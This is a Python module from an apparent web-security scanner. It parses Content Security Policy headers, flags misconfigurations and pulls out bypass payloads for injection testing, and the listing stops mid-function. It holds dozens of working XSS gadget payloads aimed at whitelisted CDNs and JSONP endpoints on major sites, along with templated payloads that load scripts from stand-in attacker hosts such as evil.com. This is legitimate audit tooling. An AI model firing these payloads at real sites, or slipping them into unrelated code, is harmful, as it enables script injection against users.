"""Content Security Policy (CSP) analysis and bypass suggestion engine.

A strong CSP is the last line of defense against XSS: even if an attacker
injects `<script>`, CSP can block execution.  But CSP is frequently
misconfigured in ways that leave script gadgets open:

  * `script-src 'unsafe-inline'` -> inline scripts run (CSP useless).
  * `script-src 'unsafe-eval'`   -> eval(), Function(), setTimeout(str) run
    *inside scripts that already execute*; on its own it is NOT an inline
    bypass (Phase 278: the old entry claimed otherwise and caused FPs).
  * `script-src cdn.cloudflare.com` -> JSONP / Angular gadgets on that CDN.
  * `script-src *.google.com`     -> google.com hosts JSONP endpoints.
  * Whitelisted CDNs hosting known script gadgets (Angular, Prototype,
    MooTools, Dojo, Backbone) -> CSP bypass via framework gadgets.

This module parses the CSP header, classifies it, and reports concrete
bypass techniques when applicable.  It does NOT execute the bypasses --
it gives the auditor a clear, actionable finding.
"""
from __future__ import annotations
import re
from dataclasses import dataclass, field
from html import unescape

# Known CDN/script gadget hosts that, if whitelisted by CSP, enable a
# bypass.  Each entry: (host_pattern, gadget_type, bypass_payload_or_note)
#
# Phase 20: expanded from 7 to 35+ entries based on Google CSP Evaluator
# (https://csp-evaluator.withgoogle.com) and the "CSP Bypass" research
# corpus (https://github.com/GoogleChromeLabs/csp-evaluator).  Covers
# Angular/Prototype/Dojo/MooTools/Backbone/Knockout/Vue/React CDN gadgets
# plus JSONP endpoints on every major host known to host them.
SCRIPT_GADGETS: list[tuple[str, str, str]] = [
    # --- Angular (template sandbox-escape gadget) -------------------------
    # Angular 1.x ships on every major CDN; {{constructor.constructor(...)}}
    # escapes the sandbox and runs in CSP mode when ng-csp is set.
    (r'ajax\.googleapis\.com',
     "Angular JS via googleapis CDN",
     "<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js></script>"
     "<div ng-app ng-csp>{{constructor.constructor(\"alert(1)\")()}}</div>"),
    (r'cdn\.jsdelivr\.net',
     "Angular JS via jsdelivr CDN",
     "<script src=https://cdn.jsdelivr.net/npm/angular@1.7.9/angular.min.js></script>"
     "<div ng-app ng-csp>{{constructor.constructor(\"alert(1)\")()}}</div>"),
    (r'cdnjs\.cloudflare\.com',
     "Angular JS via cloudflare CDN",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.min.js></script>"
     "<div ng-app ng-csp>{{constructor.constructor(\"alert(1)\")()}}</div>"),
    (r'unpkg\.com',
     "Angular JS via unpkg CDN",
     "<script src=https://unpkg.com/angular@1.8.0/angular.min.js></script>"
     "<div ng-app ng-csp>{{constructor.constructor(\"alert(1)\")()}}</div>"),
    (r'cdn\.bootcdn\.net',
     "Angular JS via BootCDN",
     "<script src=https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.0/angular.min.js></script>"
     "<div ng-app ng-csp>{{constructor.constructor(\"alert(1)\")()}}</div>"),
    (r'cdn\.jsdelivr\.net/npm/vue',
     "Vue.js template injection via jsdelivr",
     "<script src=https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.min.js></script>"
     "<div id=x>{{_c.constructor(\"alert(1)\")()}}</div>"),
    (r'cdnjs\.cloudflare\.com/ajax/libs/vue',
     "Vue.js template injection via cloudflare",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.14/vue.min.js></script>"
     "<div id=x>{{$root.constructor.constructor(\"alert(1)\")()}}</div>"),
    # --- Prototype.js -----------------------------------------------------
    (r'ajax\.googleapis\.com/ajax/libs/prototype',
     "Prototype.js String#evalJSON / periodicalExecuter",
     "<script src=https://ajax.googleapis.com/ajax/libs/prototype/1.7.3/prototype.js></script>"
     "<form action=javascript:alert(1)><button formaction=javascript:alert(1)>x"),
    (r'cdnjs\.cloudflare\.com/ajax/libs/prototype',
     "Prototype.js via cloudflare CDN",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.js></script>"
     "<form action=javascript:alert(1)>"),
    # --- Dojo -------------------------------------------------------------
    (r'ajax\.googleapis\.com/ajax/libs/dojo',
     "Dojo eval-based gadget",
     "<script src=https://ajax.googleapis.com/ajax/libs/dojo/1.13.0/dojo/dojo.js></script>"
     "<div data-dojo-type=\"dijit/Declaration\">x</div>"),
    (r'cdnjs\.cloudflare\.com/ajax/libs/dojo',
     "Dojo via cloudflare CDN",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/dojo/1.13.0/dojo/dojo.js></script>"
     "<div data-dojo-props=\"onClick:alert(1)\">x</div>"),
    # --- MooTools ---------------------------------------------------------
    (r'cdnjs\.cloudflare\.com/ajax/libs/mootools',
     "MooTools eval-based gadget",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools.min.js></script>"
     "<a href=javascript:alert(1)>x</a>"),
    (r'ajax\.googleapis\.com/ajax/libs/mootools',
     "MooTools via googleapis CDN",
     "<script src=https://ajax.googleapis.com/ajax/libs/mootools/1.6.0/mootools-yui-compressed.js></script>"),
    # --- Backbone / Marionette -------------------------------------------
    (r'cdnjs\.cloudflare\.com/ajax/libs/backbone\.js',
     "Backbone.js view HTML injection gadget",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/backbone.js/1.4.0/backbone-min.js></script>"
     "<script>Backbone.View.extend({}).extend({render:()=>this.$el.html('<img src=x onerror=alert(1)>')})</script>"),
    # --- Knockout ---------------------------------------------------------
    (r'cdnjs\.cloudflare\.com/ajax/libs/knockout',
     "Knockout data-bind HTML injection gadget",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.1/knockout-min.js></script>"
     "<div data-bind='html:\"<img src=x onerror=alert(1)>\"'></div>"),
    # --- jQuery (html() / load() sinks) ----------------------------------
    (r'code\.jquery\.com',
     "jQuery .html()/.load() sink gadget",
     "<script src=https://code.jquery.com/jquery-3.6.0.min.js></script>"
     "<div id=x><script>$('#x').html('<img src=x onerror=alert(1)>')</script></div>"),
    (r'ajax\.googleapis\.com/ajax/libs/jquery',
     "jQuery via googleapis CDN",
     "<script src=https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js></script>"
     "<div id=x><script>$('#x').html('<img src=x onerror=alert(1)>')</script></div>"),
    (r'cdnjs\.cloudflare\.com/ajax/libs/jquery',
     "jQuery via cloudflare CDN",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js></script>"),
    # --- JSONP endpoints on whitelisted origins --------------------------
    # google.com family (multiple JSONP endpoints, well-documented)
    (r'www\.google\.com',
     "google.com JSONP endpoint (callback parameter)",
     "<script src=https://www.google.com/complete/search?client=chrome&q=x&callback=alert(1)//></script>"),
    (r'googleapis\.com',
     "googleapis.com JSONP endpoint",
     "<script src=https://content.googleapis.com/discovery/v1/apis?callback=alert(1)//></script>"),
    (r'maps\.googleapis\.com',
     "Google Maps JSONP endpoint",
     "<script src=https://maps.googleapis.com/maps/api/js?callback=alert(1)//></script>"),
    (r'translate\.google\.com',
     "Google Translate JSONP",
     "<script src=https://translate.google.com/translate_a/t?client=t&callback=alert(1)//></script>"),
    # Yandex JSONP family
    (r'api\.yandex\.ru',
     "Yandex JSONP",
     "<script src=https://api.yandex.ru/jslib/...?callback=alert(1)//></script>"),
    (r'yandex\.ru',
     "Yandex search suggest JSONP",
     "<script src=https://suggest.yandex.ru/suggest-ya.cgi?part=alert(1)//></script>"),
    # Bing
    (r'www\.bing\.com',
     "Bing JSONP endpoint",
     "<script src=https://www.bing.com/AS/Suggestions?&mkt=en-us&qry=x&cp=1&callback=alert(1)//></script>"),
    # Yahoo
    (r'search\.yahoo\.com',
     "Yahoo search JSONP",
     "<script src=https://search.yahoo.com/sugg/goss/goss.php?command=alert(1)//></script>"),
    # Baidu
    (r'suggestion\.baidu\.com',
     "Baidu suggestion JSONP",
     "<script src=https://suggestion.baidu.com/su?wd=x&cb=alert(1)//></script>"),
    # GitHub
    (r'github\.com',
     "GitHub gist raw JSONP (callback)",
     "<script src=https://github.com/timeline?callback=alert(1)//></script>"),
    # Flickr / Tumblr / WordPress
    (r'api\.flickr\.com',
     "Flickr JSONP API",
     "<script src=https://api.flickr.com/services/rest/?method=flickr.test.echo&format=json&jsoncallback=alert(1)//></script>"),
    (r'api\.tumblr\.com',
     "Tumblr JSONP API",
     "<script src=https://api.tumblr.com/v2/blog/x.tumblr.com/info?api_key=x&jsonp=alert(1)//></script>"),
    (r'public-api\.wordpress\.com',
     "WordPress.com JSONP REST API",
     "<script src=https://public-api.wordpress.com/rest/v1/?callback=alert(1)//></script>"),
    # --- ad/analytics CDNs that host JSONP --------------------------------
    (r'googleads\.g\.doubleclick\.net',
     "Doubleclick JSONP",
     "<script src=https://googleads.g.doubleclick.net/pagead/conversion/...?callback=alert(1)//></script>"),
    (r's\.cnzz\.com',
     "CNZZ JSONP",
     "<script src=https://s.cnzz.com/core.php?callback=alert(1)//></script>"),
    # --- Angular from *.angular.io / *.angularjs.org ---------------------
    (r'code\.angularjs\.org',
     "Angular via code.angularjs.org",
     "<script src=https://code.angularjs.org/1.8.0/angular.min.js></script>"
     "<div ng-app ng-csp>{{constructor.constructor(\"alert(1)\")()}}</div>"),
    # --- CDN-hosted polyfills (can be abused as eval sinks) --------------
    (r'cdn\.polyfill\.io',
     "polyfill.io script injection (deprecated CDN)",
     "<script src=https://cdn.polyfill.io/v2/polyfill.min.js?features=alert(1)//></script>"
     " [note: polyfill.io was sold and is no longer trustworthy; if whitelisted, treat as compromised]"),
]


@dataclass
class CSPReport:
    header: str = ""
    directives: dict = field(default_factory=dict)
    weak: list[str] = field(default_factory=list)
    bypasses: list[dict] = field(default_factory=list)
    bypassable: bool = False


def parse_csp(header: str) -> dict:
    """Parse a CSP header into a directives dict.

    'default-src \'self\'; script-src \'self\' cdn.example.com'
    -> {'default-src': ["'self'"], 'script-src': ["'self'", 'cdn.example.com']}
    """
    out = {}
    if not header:
        return out
    for directive in header.split(";"):
        directive = directive.strip()
        if not directive:
            continue
        parts = directive.split()
        if not parts:
            continue
        name = parts[0].lower()
        out[name] = parts[1:]
    return out


# ---------------------------------------------------------------------------
# Where a policy arrives from: HTTP header OR <meta>, enforcing OR report-only
# ---------------------------------------------------------------------------
# Chromium honours `<meta http-equiv="Content-Security-Policy">` exactly like
# the response header -- measured on this host (dev/_p196_csp_delivery): an
# inline reflection under a meta policy raises no dialog, the same shape that
# the header does silence.  Report-Only blocks nothing in either channel.
# Reading only the enforcing header therefore over-claimed execution on
# meta-protected pages (false positive) and let a non-enforcing policy be
# reported as a bypass.
_META_TAG_RE = re.compile(r"""<meta\b(?:[^>"']|"[^"]*"|'[^']*')*>""",
                          re.I | re.S)
_ATTR_RE = re.compile(
    r"""([a-zA-Z-]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+))""")


def _meta_attributes(tag: str) -> dict:
    """name -> value for one <meta> start tag; browsers unescape entities in
    attribute values, so a `&quot;`-wrapped policy parses as real quotes."""
    out: dict[str, str] = {}
    for m in _ATTR_RE.finditer(tag):
        name = m.group(1).lower()
        value = next((g for g in m.group(2, 3, 4) if g is not None), "")
        out.setdefault(name, unescape(value))
    return out


#: Directive names a policy can legitimately start with.  Used only to
#: decide whether a comma inside a header value starts a NEW policy (the
#: HTTP field-line join) or is part of a source expression (a URL path).
_KNOWN_DIRECTIVES = frozenset({
    "base-uri", "block-all-mixed-content", "child-src", "connect-src",
    "default-src", "font-src", "form-action", "frame-ancestors",
    "frame-src", "img-src", "manifest-src", "media-src", "navigate-to",
    "object-src", "plugin-types", "prefetch-src", "report-to", "report-uri",
    "require-sri-for", "require-trusted-types-for", "sandbox", "script-src",
    "script-src-attr", "script-src-elem", "style-src", "style-src-attr",
    "style-src-elem", "trusted-types", "upgrade-insecure-requests",
    "worker-src",
})

_JOINED_TAIL_RE = re.compile(r"\s*([a-z][a-z0-9-]*)\s")


def _split_joined(text: str) -> list[str]:
    """Split one header value into the policies it encodes.

    Repeated HTTP field lines reach a client as ONE comma-joined value
    (RFC 9110), while CSP treats every line as its own policy and a
    script must satisfy ALL enforcing policies.  Measured (Phase 326):
    ``requests`` hands a client ``"script-src 'self' 'unsafe-inline',
    script-src 'self'"`` for two header lines -- read as one policy, the
    strict second policy vanishes and the page is judged bypassable
    (false-positive direction).

    The split is conservative on purpose: a comma only starts a new
    policy when the next token is a KNOWN directive name.  A comma inside
    a source expression (``https://cdn.example.com/a,b.js``) is left
    where it belongs.
    """
    parts: list[str] = []
    cur: list[str] = []
    i = 0
    while i < len(text):
        if text[i] == ",":
            m = _JOINED_TAIL_RE.match(text, i + 1)
            if m and m.group(1).lower() in _KNOWN_DIRECTIVES:
                parts.append("".join(cur))
                cur = []
                i += 1
                continue
        cur.append(text[i])
        i += 1
    parts.append("".join(cur))
    return [p.strip() for p in parts if p.strip()]


def _as_policy_list(value) -> list[str]:
    """One header value (str or list of strs) -> the policies it encodes."""
    if value is None:
        return []
    if isinstance(value, (list, tuple)):
        out: list[str] = []
        for v in value:
            out.extend(_as_policy_list(v))
        return out
    return _split_joined(str(value))


def meta_policies(html: str | None) -> tuple[list, list]:
    """Return ([enforcing], [report-only]) policies carried by <meta> tags."""
    enforcing: list[str] = []
    report_only: list[str] = []
    for tag in _META_TAG_RE.findall(html or ""):
        attrs = _meta_attributes(tag)
        equiv = (attrs.get("http-equiv") or "").strip().lower()
        content = (attrs.get("content") or "").strip()
        if not content:
            continue
        if equiv == "content-security-policy":
            enforcing.extend(_as_policy_list(content))
        elif equiv == "content-security-policy-report-only":
            report_only.extend(_as_policy_list(content))
    return enforcing, report_only


def policies(headers: dict | None = None, html: str | None = None) -> dict:
    """Every policy the browser will act on, split by enforcement mode.

    More than one enforcing policy can be in force (repeated headers,
    header AND meta); a script runs only when all of them allow it, so
    "is inline blocked?" is any() over this list rather than a lookup of
    the first entry.

    ``headers`` values may be a single string (the ``requests`` view, where
    repeated field lines arrive comma-joined) or a list of strings (the raw
    ``getlist`` view); both are normalized into the full policy list
    (Phase 326).
    """
    lower = {str(k).lower(): v for k, v in (headers or {}).items()}
    meta_enf, meta_ro = meta_policies(html)
    header_enf = _as_policy_list(lower.get("content-security-policy"))
    header_ro = _as_policy_list(lower.get("content-security-policy-report-only"))
    return {"enforcing": header_enf + meta_enf,
            "report_only": header_ro + meta_ro}


def blocks_family(pol: dict | None, family: str) -> bool:
    """Whether ANY enforcing policy blocks this delivery family.

    Report-only policies are never consulted: they only generate reports.
    """
    return any(inline_blocked(p, family)
               for p in (pol or {}).get("enforcing", []) if p)


_SCRIPT_SRC_RE = re.compile(r"<script\b[^>]*\bsrc\s*=", re.I)


def script_execution_blocked(headers: dict | None = None,
                             html: str | None = None) -> bool:
    """True only when NO script on this page can execute under its CSP.

    This is the premise that makes a page-feature finding unsupportable:
    when every script route the page actually carries is blocked, a
    mutation/postMessage/WebSocket/clobber claim has no execution channel.
    Measured on XSSMaze `csp-bypass-level3` / `cspbypass-level3` /
    `csp-bypass-level4` (inline-only pages whose policies carry no
    `'unsafe-inline'`, no nonce/hash, no external script and no bypass).

    Conservative by construction — anything that could still execute makes
    this False:
      * no enforcing policy at all;
      * any ``<script src=...>`` element (its URL may be allowed);
      * a nonce/hash source in either family (the page's own scripts may
        carry it; only inline injection is blocked);
      * ``analyze()`` reports a bypass (wildcard / gadget / inline).
    """
    pol = policies(headers, html)
    enforcing = [p for p in pol.get("enforcing", []) if p]
    if not enforcing:
        return False
    if _SCRIPT_SRC_RE.search(html or ""):
        return False
    for header in enforcing:
        directives = parse_csp(header)
        for family in ("elem", "attr"):
            if family_allows_inline(directives, family):
                return False
            if _NONCE_OR_HASH_RE.search(
                    " ".join(family_sources(directives, family))):
                return False
        rep = analyze(header)
        if rep.bypassable or rep.bypasses:
            return False
    return True


# ---------------------------------------------------------------------------
# CSP3 delivery families: which directive actually governs a payload
# ---------------------------------------------------------------------------
# ``script-src-elem`` and ``script-src-attr`` do not *add* to ``script-src``
# -- they REPLACE it for their own delivery type, and when present the older
# directive is not consulted at all for that type.  A policy may therefore
# allow event-handler attributes while blocking <script> elements, or the
# other way round, and reading only ``script-src`` gets both directions wrong:
#
#   script-src 'self'; script-src-attr 'unsafe-inline'
#       -> on* reflection executes; <script> does not.
#   script-src 'nonce-abc' 'unsafe-inline'; script-src-attr 'unsafe-inline'
#       -> the nonce inert-izes 'unsafe-inline' for elements only; handlers
#          are governed by a list that carries no nonce at all.
SCRIPT_FAMILIES = {
    "elem": ("script-src-elem", "script-src", "default-src"),
    "attr": ("script-src-attr", "script-src", "default-src"),
    # javascript: URIs are CSP's "inline script" for URLs; no -uri directive
    # exists, so script-src governs them.
    "uri": ("script-src", "default-src"),
}

_NONCE_OR_HASH_RE = re.compile(
    r"'(?:nonce-[^']+|sha(?:256|384|512)-[^']+)'", re.I)


def governing_directive(directives: dict, family: str = "elem") -> str:
    """Name of the directive that decides this family, or "" when none does."""
    for name in SCRIPT_FAMILIES[family]:
        if directives.get(name):
            return name
    return ""


def family_sources(directives: dict, family: str = "elem") -> list:
    """Source list of the governing directive for one delivery family."""
    return list(directives.get(governing_directive(directives, family)) or [])


def family_allows_inline(directives: dict, family: str = "elem") -> bool:
    """Whether inline script of one delivery family still executes.

    An unrestricted policy (no script-src / default-src at all) allows it.
    Per CSP Level 2+ a nonce or hash source in the governing list makes
    ``'unsafe-inline'`` INERT -- and the rule is per list, which is exactly
    why the family matters: a nonce sitting in ``script-src`` does not
    inert-ize a ``script-src-attr`` that carries only ``'unsafe-inline'``.
    """
    src = family_sources(directives, family)
    if not src:
        return True
    joined = " ".join(src)
    if "'unsafe-inline'" not in joined:
        return False
    return not _NONCE_OR_HASH_RE.search(joined)


def inline_blocked(csp_header: str, family: str = "elem") -> bool:
    """Whether a CSP header stops inline script of one delivery family.

    ``'unsafe-eval'`` is deliberately not an escape here: it opens ``eval()``,
    not an reflected ``<script>`` tag, and conflating the two was how a policy
    of ``script-src 'unsafe-eval'`` used to read as "inline works".
    """
    directives = parse_csp(csp_header or "")
    if not directives:
        return False
    return not family_allows_inline(directives, family)


def analyze(csp_header: str) -> CSPReport:
    """Full CSP analysis.  Returns a CSPReport."""
    rep = CSPReport(header=csp_header or "")
    rep.directives = parse_csp(csp_header)
    if not rep.directives:
        rep.weak.append("no CSP header")
        return rep

    elem_src = family_sources(rep.directives, "elem")
    attr_src = family_sources(rep.directives, "attr")
    # Host allowlists are consulted for every script delivery type, so the
    # gadget / wildcard sweep reads the union of the governing lists --
    # ``script-src-elem https://cdn.example.com`` is a gadget route even
    # though ``script-src`` itself is absent.
    script_src = list(dict.fromkeys(
        list(elem_src) + list(attr_src) + list(family_sources(rep.directives, "uri"))))
    object_src = rep.directives.get("object-src") or rep.directives.get("default-src") or []
    base_uri = rep.directives.get("base-uri") or []

    # Check for dangerous keywords.  Inline is a PER-FAMILY answer (see
    # SCRIPT_FAMILIES): "which payload runs" and "does anything run" are
    # different questions when the policy splits elem from attr.
    elem_inline = family_allows_inline(rep.directives, "elem")
    attr_inline = family_allows_inline(rep.directives, "attr")
    if elem_inline or attr_inline:
        if elem_inline:
            inline_payload = "<script>alert(1)</script>"
            if family_sources(rep.directives, "elem"):
                inline_reason = ("'unsafe-inline' allows any inline <script>")
                rep.weak.append(
                    f"{governing_directive(rep.directives, 'elem')} "
                    "'unsafe-inline' -> inline scripts run")
            else:
                inline_reason = ("no script-src / default-src restriction in "
                                 "this policy -> inline scripts run")
                rep.weak.append("CSP restricts no scripts -> inline scripts run")
        else:
            inline_payload = "<img src=x onerror=alert(1)>"
            inline_reason = ("'unsafe-inline' allows on* event-handler "
                             "attributes")
            rep.weak.append(
                f"{governing_directive(rep.directives, 'attr')} "
                "'unsafe-inline' -> on* handlers run; <script> elements do not")
        rep.bypassable = True
        rep.bypasses.append({
            "type": "inline",
            "payload": inline_payload,
            "reason": inline_reason,
        })
    if "'unsafe-eval'" in script_src:
        # Phase 278 (was XSSMaze `csp-bypass-level3` / `cspbypass-level3`
        # false positives): 'unsafe-eval' is NOT an inline bypass and must
        # not produce a bypass entry.
        #
        # The old entry claimed the payload
        # ``<script>eval('alert(1)')</script>`` and set ``bypassable=True``.
        # That payload is an inline ``<script>`` element: every policy that
        # carries ``'unsafe-eval'`` *instead of* ``'unsafe-inline'`` blocks
        # it -- and ``family_allows_inline()`` above already answered that
        # question per family.  ``'unsafe-eval'`` only widens what an
        # ALREADY-EXECUTING script may call (eval / new Function); it does
        # not authorize inline ``<script>`` elements or ``on*`` attributes.
        # Whether such a sink exists is a property of the page, not of the
        # header, so static header analysis cannot support the claim.
        #
        # Consumers that read ``rep.bypassable`` therefore correctly treat
        # an eval-only policy as ``is_strict_inline() == True`` (inline is
        # genuinely blocked).  No bypass entry is produced, so ``bypasses``
        # stays empty and ``best_bypass()`` returns None.
        rep.weak.append(
            "script-src 'unsafe-eval' -> eval()/new Function() run inside "
            "scripts that already execute; it does NOT authorize inline "
            "<script> elements or on* handlers")

    # Check for whitelisted CDN/script gadget hosts
    for source in script_src:
        if source.startswith("'") and source.endswith("'"):
            continue  # keyword like 'self', 'unsafe-inline'
        for pat, gadget, payload in SCRIPT_GADGETS:
            if re.search(pat, source, re.IGNORECASE):
                rep.weak.append(f"script-src whitelists {source} -> {gadget}")
                rep.bypassable = True
                rep.bypasses.append({
                    "type": "script_gadget",
                    "host": source,
                    "gadget": gadget,
                    "payload": payload,
                })
        # Phase 187: registered gadgets (register_gadget) participate in the
        # WHOLE pipeline, not just payload extraction -- the relevance gate
        # and is_strict_inline both read analyze(), so a lab/CDN gadget that
        # only lived in gadget_bypass_payloads would never be attempted.
        for g in _EXTRA_GADGETS:
            try:
                if re.search(g["pattern"], source, re.IGNORECASE):
                    rep.weak.append(
                        f"script-src whitelists {source} -> {g['desc']}")
                    rep.bypassable = True
                    rep.bypasses.append({
                        "type": "script_gadget",
                        "host": source,
                        "gadget": g["desc"],
                        "payload": g["template"].replace("__SRC__", source),
                    })
            except re.error:
                continue

    # Check for 'strict-dynamic' (good defense)
    if "'strict-dynamic'" in script_src:
        rep.weak.append("uses 'strict-dynamic' (good; nonces/whitelist less relevant)")

    # Check for nonce/hash with 'unsafe-inline' (nonce/hash makes
    # 'unsafe-inline' ignored by modern browsers -- a common safe pattern).
    # Informational only now: family_allows_inline() already applied that
    # inertness per family, so no inert inline bypass was added above, and a
    # ``script-src-attr 'unsafe-inline'`` list carrying no nonce keeps its
    # event-handler bypass.
    has_nonce = any(s.startswith("'nonce-") for s in script_src)
    has_hash = any(s.startswith("'sha") for s in script_src)
    if (has_nonce or has_hash) and "'unsafe-inline'" in script_src:
        rep.weak.append("nonce/hash present; 'unsafe-inline' ignored by modern browsers")
    if "'unsafe-hashes'" in script_src:
        rep.weak.append(
            "'unsafe-hashes' present -> a listed hash can authorize an "
            "on* attribute, which bare 'unsafe-inline' would not")

    # -- Phase 20: additional advanced checks -----------------------------

    # 1. Wildcard in script-src (e.g. *.cdn.com) -> any subdomain can host
    #    attacker-controlled script.  Common misconfiguration.
    for source in script_src:
        if source.startswith("*."):
            rep.weak.append(
                f"script-src wildcard '{source}' -> any subdomain can host "
                f"attacker-controlled script (e.g. via compromised subdomain "
                f"or JSONP endpoint)")
            rep.bypassable = True
            rep.bypasses.append({
                "type": "wildcard",
                "host": source,
                "payload": f"<script src=https://evil.{source[2:]}/x.js></script>",
                "reason": (f"wildcard '{source}' allows any subdomain; an "
                           f"attacker who controls a subdomain (or finds a "
                           f"JSONP endpoint on one) can serve a script"),
            })

    # 2. object-src / plugin-types not set -> <object>/<embed> can load
    #    javascript: or data: URIs in legacy browsers.
    if not object_src and "default-src" not in rep.directives:
        rep.weak.append("no object-src and no default-src -> <object>/<embed> unrestricted")
    elif object_src and "'none'" not in object_src:
        # object-src is set but allows something -- check for data:/blob:.
        if any(s in ("data:", "blob:", "http:", "ftp:") for s in object_src):
            rep.weak.append(
                "object-src allows data:/blob:/http: -> <object data=data:text/html,...> can execute")

    # 3. base-uri not restricted -> <base href=javascript:...> can hijack
    #    relative URLs (dangling-markup + CSP bypass combo).
    if not base_uri:
        rep.weak.append(
            "no base-uri -> <base href=//evil.com/> can hijack relative script URLs "
            "(if the page loads any relative <script src=app.js>, attacker controls it)")

    # 4. Missing 'X-Content-Type-Options: nosniff' allows MIME sniffing on
    #    uploaded files (cross-check is caller's job, but worth flagging).
    # 5. frame-ancestors not set -> clickjacking possible (defense-in-depth).
    if "frame-ancestors" not in rep.directives and "default-src" not in rep.directives:
        rep.weak.append("no frame-ancestors -> clickjacking possible (UI redress)")

    # 6. report-uri / report-to not set -> CSP violations not reported.
    if "report-uri" not in rep.directives and "report-to" not in rep.directives:
        rep.weak.append(
            "no report-uri/report-to -> CSP violations are silently blocked; "
            "add a reporting endpoint for visibility")

    # 7. Missing upgrade-insecure-requests on https sites -> mixed content.
    if "upgrade-insecure-requests" not in rep.directives:
        rep.weak.append(
            "no 'upgrade-insecure-requests' -> http: subresources allowed on https pages (mixed content)")

    # 8. Trusted Types check: if 'require-trusted-types-for' is absent, the
    #    page is vulnerable to DOM XSS via innerHTML/outerHTML/document.write
    #    even with a strict CSP (TT is the only reliable DOM-XSS defense).
    if "require-trusted-types-for" not in rep.directives:
        rep.weak.append(
            "no 'require-trusted-types-for \"script\"' -> DOM XSS via "
            "innerHTML/outerHTML/document.write is not blocked at the DOM sink "
            "(Trusted Types is the only reliable DOM-XSS mitigation)")
    else:
        # Check that trusted-types policy is also declared.
        tt = rep.directives.get("trusted-types") or []
        if not tt:
            rep.weak.append(
                "'require-trusted-types-for' set but no 'trusted-types' policy -> "
                "all DOM sink calls will fail (may break the page)")

    # 9. JSONP via 'self' when the same origin hosts a JSONP endpoint.
    #    We can't enumerate the origin here, but flag the pattern so the
    #    auditor checks for it.
    if "'self'" in script_src:
        rep.weak.append(
            "'self' whitelisted -> if this origin hosts any JSONP endpoint "
            "(search/suggest/translate callback), CSP is bypassable")

    return rep


def is_bypassable(csp_header: str) -> bool:
    """Quick check whether the CSP is bypassable."""
    return analyze(csp_header).bypassable


# ---------------------------------------------------------------------------
# Phase 187: executable gadget chains (absorbed from the nuclei csp-bypass
# template family / renniepak CSPBypass corpus).
#
# The SCRIPT_GADGETS table above has always KNOWN these bypasses; ``analyze``
# reports them as static suggestions ("It does NOT execute the bypasses" --
# its own docstring).  The competitors' measurement culture went one step
# further: inject the gadget payload and watch a real browser for the dialog.
# This module now supports that: ``gadget_bypass_payloads`` extracts
# token-stampable payloads for the allowlisted hosts, and the scanners run
# them through the normal reflection + headless-confirmation machinery.
# ---------------------------------------------------------------------------
_EXTRA_GADGETS: list[dict] = []


def register_gadget(pattern: str, template: str, desc: str = "") -> None:
    """Register an additional script gadget (lab targets, tests, new CDNs).

    ``pattern`` is a regex matched against each script-src source; when it
    matches, ``template`` (a full HTML payload, conventionally calling
    ``alert(1)`` so ``verifier.mark`` can stamp the probe token) becomes an
    executable candidate.  ``__SRC__`` inside the template is replaced with
    the matched source (so ``<script src="__SRC__/jsonp?cb=alert(1)">`` rides
    whatever host the policy actually allowlists).  Registered gadgets are
    additive: the static table is untouched and an empty registry behaves
    exactly like before.
    """
    _EXTRA_GADGETS.append({"pattern": pattern, "template": template,
                           "desc": desc or "registered gadget"})


def gadget_bypass_payloads(csp_header: str) -> list[dict]:
    """Executable gadget payloads for the script sources this CSP allowlists.

    Returns ``[{"payload", "gadget", "host"}]`` -- deduped, static-table
    matches first, registered gadgets second.  Payloads are raw (token
    UNSTAMPED); the caller stamps them with ``verifier.mark`` so a dialog can
    be attributed.  ``wildcard`` bypasses are deliberately excluded: their
    payload points at a host the attacker must control first, so there is
    nothing WE can execute to measure them.
    """
    if not csp_header:
        return []
    rep = analyze(csp_header)
    out: list[dict] = []
    seen: set[str] = set()

    def _add(payload: str, gadget: str, host: str) -> None:
        if payload and payload not in seen:
            seen.add(payload)
            out.append({"payload": payload, "gadget": gadget, "host": host})

    for b in rep.bypasses:
        if b.get("type") == "script_gadget":
            _add(b.get("payload", ""), b.get("gadget", ""), b.get("host", ""))
    return out


def gadget_chain_relevant(csp_header: str) -> bool:
    """True when a whitelisted gadget is the ONLY script route left.

    Relevant means: the analyzer found a ``script_gadget`` bypass AND inline
    execution is unavailable for EVERY delivery family (no ``'unsafe-inline'``;
    a nonce/hash source makes it inert per CSP Level 2+).  With inline
    available the ordinary payload queue already works and a gadget attempt
    would be a redundant request.  ('unsafe-eval' does NOT make gadgets
    redundant -- eval-based sinks still need an injection point of their own.)
    """
    if not csp_header:
        return False
    try:
        rep = analyze(csp_header)
    except Exception:
        return False
    if not any(b.get("type") == "script_gadget" for b in rep.bypasses):
        return False
    return not any(family_allows_inline(rep.directives, family)
                   for family in SCRIPT_FAMILIES)


def unsafe_inline_overridden(csp_header: str, family: str = "elem") -> bool:
    """Phase 98: a nonce/hash source makes ``'unsafe-inline'`` INERT.

    Real-world CSP headers almost always carry BOTH: a nonce (or hash)
    for current browsers plus ``'unsafe-inline'`` as a fallback for
    ancient user agents that do not understand nonces.  Per CSP Level 2+
    the browser MUST then IGNORE ``'unsafe-inline'`` -- inline <script>
    and event handlers only run when they carry a matching nonce or hash.

    Treating the mere presence of ``'unsafe-inline'`` as "inline works"
    (the pre-Phase-98 behaviour, in both this module and verifier)
    produced systematic FALSE POSITIVES on exactly those targets: a
    high/high reflected finding whose PoC never fires.

    Phase 189 made it per family, because the same rule produced the
    opposite error: a nonce in ``script-src`` does NOT inert-ize a
    ``script-src-attr`` list that carries only ``'unsafe-inline'``, so
    answering for ``<script>`` and for ``on*`` from one list turned a
    working event-handler injection into a refutation.

    This is about INLINE execution only -- ``'strict-dynamic'`` (which
    invalidates host sources, not inline sources) is deliberately not
    considered here.
    """
    rep = analyze(csp_header or "")
    if not rep.directives:
        return False
